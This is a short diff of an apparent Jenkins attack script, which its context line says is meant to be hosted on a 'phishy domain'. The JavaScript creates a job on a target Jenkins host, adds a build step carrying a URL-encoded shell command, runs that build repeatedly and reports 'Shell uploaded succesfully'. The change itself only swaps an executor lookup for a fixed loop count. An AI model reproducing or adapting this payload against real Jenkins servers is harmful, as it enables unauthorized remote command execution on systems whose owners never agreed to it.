@@ -58,9 +58,9 @@ So if you want to host script on some phishy domain, it will work only on jenkin
           var Payload = "echo%20%2712312%27%20%7C%20write%20pentest%20pts%2F0";
           createJob(name, host);
           addBuildStep(name, Payload, host);
-          executors = getExecutors(host)
-          alert(executors)
-          for(i=0; i< executors; i++){
+          //executors = getExecutors(host)
+          //alert(executors)
+          for(i=0; i< 10; i++){
             rubBuild(name,host);
           }
           document.getElementById("result").innerHTML = "Shell uploaded succesfully";
